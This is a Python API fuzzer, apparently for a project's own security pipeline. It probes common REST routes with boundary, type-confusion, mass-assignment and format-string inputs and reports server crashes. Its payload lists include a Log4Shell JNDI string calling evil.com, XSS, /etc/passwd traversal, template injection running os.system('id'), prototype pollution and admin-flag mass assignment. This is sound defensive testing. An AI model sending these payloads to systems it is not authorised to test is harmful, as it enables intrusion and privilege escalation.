#!/usr/bin/env python3
"""
API Fuzzer for aig Monorepo
Fuzzes all API endpoints with malformed inputs
Tests: Boundary testing, Type confusion, Mass assignment
Output: crash reports
"""

import argparse
import asyncio
import json
import sys
from dataclasses import asdict, dataclass
from datetime import datetime
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

import aiohttp


@dataclass
class FuzzResult:
    endpoint: str
    method: str
    category: str
    payload: Any
    response_status: int
    response_time: float
    response_body: str
    crash: bool
    error_type: str | None


class APIFuzzer:
    def __init__(self, base_url: str, output_dir: Path, auth_token: str | None = None, max_requests: int = 1000):
        self.base_url = base_url.rstrip("/")
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.auth_token = auth_token
        self.max_requests = max_requests
        self.results: list[FuzzResult] = []
        self.session: aiohttp.ClientSession | None = None
        self.endpoints: list[dict] = []

    async def __aenter__(self):
        headers = {"User-Agent": "aig-APIFuzzer/1.0", "Content-Type": "application/json"}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        timeout = aiohttp.ClientTimeout(total=30)
        self.session = aiohttp.ClientSession(headers=headers, timeout=timeout)
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    def discover_endpoints(self) -> list[dict]:
        """Discover API endpoints"""
        endpoints = []

        common_routes = [
            ("/api/health", "GET"),
            ("/api/v1/health", "GET"),
            ("/api/users", "GET"),
            ("/api/users", "POST"),
            ("/api/users/{id}", "GET"),
            ("/api/users/{id}", "PUT"),
            ("/api/users/{id}", "DELETE"),
            ("/api/auth/login", "POST"),
            ("/api/auth/register", "POST"),
            ("/api/auth/refresh", "POST"),
            ("/api/files", "GET"),
            ("/api/files", "POST"),
            ("/api/files/{id}", "GET"),
            ("/api/files/{id}", "DELETE"),
            ("/api/upload", "POST"),
            ("/api/search", "GET"),
            ("/api/search", "POST"),
            ("/api/admin/users", "GET"),
            ("/api/admin/stats", "GET"),
            ("/api/config", "GET"),
            ("/api/config", "PUT"),
            ("/graphql", "POST"),
            ("/api/webhook", "POST"),
        ]

        for path, method in common_routes:
            endpoints.append({"path": path, "method": method, "params": {}})

        return endpoints

    def generate_boundary_payloads(self, param_type: str) -> list[Any]:
        """Generate boundary test payloads"""
        payloads = []

        if param_type == "integer":
            payloads.extend([
                0, -1, 1, 2147483647, -2147483648,  # 32-bit boundaries
                9223372036854775807, -9223372036854775808,  # 64-bit boundaries
                1.5, float('inf'), float('-inf'), float('nan'),
                "2147483647", "-2147483648", "999999999999999999999",
            ])
        elif param_type == "string":
            payloads.extend([
                "", "a", "a" * 255, "a" * 256, "a" * 1000, "a" * 10000,
                "\x00", "\n", "\r", "\t", "\\", "\"", "'", "`",
                "<script>alert(1)</script>", "../../etc/passwd",
                "${jndi:ldap://evil.com}", "{{7*7}}", "#{7*7}",
                "🙂" * 100, "💣" * 1000,
            ])
        elif param_type == "boolean":
            payloads.extend([True, False, "true", "false", "1", "0", "yes", "no", None, 1, 0])
        elif param_type == "array":
            payloads.extend([[], [1,2,3], [{}], [{"a":1}]*100, ["a"]*10000, None, "not-an-array"])
        elif param_type == "object":
            payloads.extend([{}, {"a":1}, {"__proto__": {"polluted": True}}, {"constructor": {"prototype": {"polluted": True}}}, None, "not-an-object"])
        elif param_type == "float":
            payloads.extend([0.0, -0.0, 1.0, -1.0, float('inf'), float('-inf'), float('nan'), 1.7976931348623157e+308, -1.7976931348623157e+308])

        return payloads

    def generate_type_confusion_payloads(self) -> list[Any]:
        """Generate type confusion payloads"""
        return [
            {"string_field": 123},
            {"int_field": "not-a-number"},
            {"bool_field": "not-a-boolean"},
            {"array_field": "not-an-array"},
            {"object_field": "not-an-object"},
            {"null_field": None},
            {"nested": {"deep": {"very": {"too": "deep" * 100}}}},
            {"circular_ref": "self"},
            {"__proto__": {"admin": True}},
            {"constructor": {"prototype": {"isAdmin": True}}},
        ]

    def generate_mass_assignment_payloads(self) -> list[dict]:
        """Generate mass assignment payloads"""
        return [
            {"username": "test", "is_admin": True, "role": "admin"},
            {"email": "test@test.com", "password": "hash", "is_superuser": True},
            {"name": "test", "credit_limit": 999999, "account_type": "premium"},
            {"id": 1, "created_at": "2020-01-01", "updated_at": "2020-01-01", "deleted_at": None},
            {"profile": {"avatar": "x", "bio": "y", "private_key": "stolen"}},
        ]

    def generate_format_string_payloads(self) -> list[str]:
        """Generate format string payloads"""
        return [
            "%s%s%s%s%s%s%s%s%s%s",
            "%n%n%n%n",
            "%p%p%p%p",
            "{__import__('os').system('id')}",
            "${{7*7}}",
            "#{7*7}",
            "%{7*7}",
            "{{config.__class__.__init__.__globals__}}",
        ]

    async def fuzz_endpoint(self, endpoint: dict, payload: Any, param_name: str = "data") -> FuzzResult | None:
        """Fuzz a single endpoint with a payload"""
        if not self.session:
            return None

        url = urljoin(self.base_url, endpoint["path"])
        method = endpoint["method"]

        start_time = time.time()
        try:
            if method == "GET":
                params = endpoint.get("params", {}).copy()
                if isinstance(payload, dict):
                    params.update(payload)
                else:
                    params[param_name] = payload
                async with self.session.get(url, params=params) as resp:
                    body = await resp.text()
                    return FuzzResult(
                        endpoint=endpoint["path"],
                        method=method,
                        category=self._categorize_payload(payload),
                        payload=str(payload)[:200],
                        response_status=resp.status,
                        response_time=time.time() - start_time,
                        response_body=body[:500],
                        crash=resp.status >= 500,
                        error_type=self._classify_error(resp.status, body)
                    )
            else:
                if isinstance(payload, dict):
                    data = payload
                else:
                    data = {param_name: payload}
                async with self.session.request(method, url, json=data) as resp:
                    body = await resp.text()
                    return FuzzResult(
                        endpoint=endpoint["path"],
                        method=method,
                        category=self._categorize_payload(payload),
                        payload=str(payload)[:200],
                        response_status=resp.status,
                        response_time=time.time() - start_time,
                        response_body=body[:500],
                        crash=resp.status >= 500,
                        error_type=self._classify_error(resp.status, body)
                    )
        except TimeoutError:
            return FuzzResult(
                endpoint=endpoint["path"],
                method=method,
                category=self._categorize_payload(payload),
                payload=str(payload)[:200],
                response_status=0,
                response_time=time.time() - start_time,
                response_body="TIMEOUT",
                crash=True,
                error_type="timeout"
            )
        except Exception as e:
            return FuzzResult(
                endpoint=endpoint["path"],
                method=method,
                category=self._categorize_payload(payload),
                payload=str(payload)[:200],
                response_status=0,
                response_time=time.time() - start_time,
                response_body=str(e)[:500],
                crash=True,
                error_type="exception"
            )

    def _categorize_payload(self, payload: Any) -> str:
        if isinstance(payload, (int, float)):
            return "boundary"
        if isinstance(payload, str) and any(c in payload for c in ["%n", "%s", "%p", "${{", "#{"]):
            return "format_string"
        if isinstance(payload, dict) and any(k in str(payload) for k in ["is_admin", "role", "is_superuser", "__proto__", "constructor"]):
            return "mass_assignment"
        if isinstance(payload, dict):
            return "type_confusion"
        return "boundary"

    def _classify_error(self, status: int, body: str) -> str | None:
        if status == 0:
            return "connection_error"
        if status >= 500:
            body_lower = body.lower()
            if "traceback" in body_lower or "exception" in body_lower:
                return "unhandled_exception"
            if "sql" in body_lower or "syntax" in body_lower:
                return "sql_error"
            if "segfault" in body_lower or "segmentation" in body_lower:
                return "segfault"
            return "server_error"
        if status == 429:
            return "rate_limited"
        return None

    async def run_fuzzing(self):
        """Run all fuzzing tests"""
        self.endpoints = self.discover_endpoints()
        print(f"[API Fuzzer] Discovered {len(self.endpoints)} endpoints")

        request_count = 0

        for endpoint in self.endpoints:
            if request_count >= self.max_requests:
                break

            print(f"[API Fuzzer] Fuzzing {endpoint['method']} {endpoint['path']}")

            # Boundary testing
            for param_type in ["integer", "string", "boolean", "float"]:
                for payload in self.generate_boundary_payloads(param_type):
                    if request_count >= self.max_requests:
                        break
                    result = await self.fuzz_endpoint(endpoint, payload)
                    if result:
                        self.results.append(result)
                        if result.crash:
                            print(f"  [CRASH] {endpoint['path']} - {result.error_type}: {result.payload[:50]}")
                    request_count += 1
                    await asyncio.sleep(0.01)

            # Type confusion
            for payload in self.generate_type_confusion_payloads():
                if request_count >= self.max_requests:
                    break
                result = await self.fuzz_endpoint(endpoint, payload)
                if result:
                    self.results.append(result)
                    if result.crash:
                        print(f"  [CRASH] {endpoint['path']} - {result.error_type}: {result.payload[:50]}")
                request_count += 1
                await asyncio.sleep(0.01)

            # Mass assignment (only for POST/PUT)
            if endpoint["method"] in ["POST", "PUT", "PATCH"]:
                for payload in self.generate_mass_assignment_payloads():
                    if request_count >= self.max_requests:
                        break
                    result = await self.fuzz_endpoint(endpoint, payload)
                    if result:
                        self.results.append(result)
                        if result.crash or result.response_status == 200:
                            print(f"  [POTENTIAL] {endpoint['path']} - Mass assignment: {result.payload[:50]}")
                    request_count += 1
                    await asyncio.sleep(0.01)

            # Format string
            for payload in self.generate_format_string_payloads():
                if request_count >= self.max_requests:
                    break
                result = await self.fuzz_endpoint(endpoint, payload, "input")
                if result:
                    self.results.append(result)
                    if result.crash:
                        print(f"  [CRASH] {endpoint['path']} - Format string: {result.payload[:50]}")
                request_count += 1
                await asyncio.sleep(0.01)

    def save_results(self):
        """Save fuzzing results"""
        crashes = [r for r in self.results if r.crash]
        potential = [r for r in self.results if r.response_status == 200 and r.category == "mass_assignment"]

        output = {
            "scan_metadata": {
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "target": self.base_url,
                "scanner_version": "1.0.0",
                "total_requests": len(self.results),
                "crashes": len(crashes),
                "potential_mass_assignment": len(potential),
                "by_category": self._count_by_category(),
                "by_error_type": self._count_by_error_type()
            },
            "crashes": [asdict(r) for r in crashes],
            "potential_issues": [asdict(r) for r in potential],
            "all_results": [asdict(r) for r in self.results]
        }

        json_file = self.output_dir / "api_fuzzer_results.json"
        json_file.write_text(json.dumps(output, indent=2, default=str))
        print(f"[API Fuzzer] Results saved to {json_file}")
        print(f"[API Fuzzer] Total: {len(self.results)}, Crashes: {len(crashes)}, Potential: {len(potential)}")

    def _count_by_category(self) -> dict[str, int]:
        counts = {}
        for r in self.results:
            counts[r.category] = counts.get(r.category, 0) + 1
        return counts

    def _count_by_error_type(self) -> dict[str, int]:
        counts = {}
        for r in self.results:
            if r.error_type:
                counts[r.error_type] = counts.get(r.error_type, 0) + 1
        return counts

    def get_exit_code(self) -> int:
        crashes = [r for r in self.results if r.crash]
        if crashes:
            return 2
        return 0


async def main():
    parser = argparse.ArgumentParser(description="API Fuzzer")
    parser.add_argument("--target", required=True, help="Target base URL")
    parser.add_argument("--output-dir", default="security-reports/api-fuzzer", help="Output directory")
    parser.add_argument("--auth-token", help="Bearer token")
    parser.add_argument("--max-requests", type=int, default=1000, help="Maximum requests")
    args = parser.parse_args()

    output_dir = Path(args.output_dir).resolve()

    async with APIFuzzer(args.target, output_dir, args.auth_token, args.max_requests) as fuzzer:
        await fuzzer.run_fuzzing()
        fuzzer.save_results()
        sys.exit(fuzzer.get_exit_code())


if __name__ == "__main__":
    import time
    asyncio.run(main())
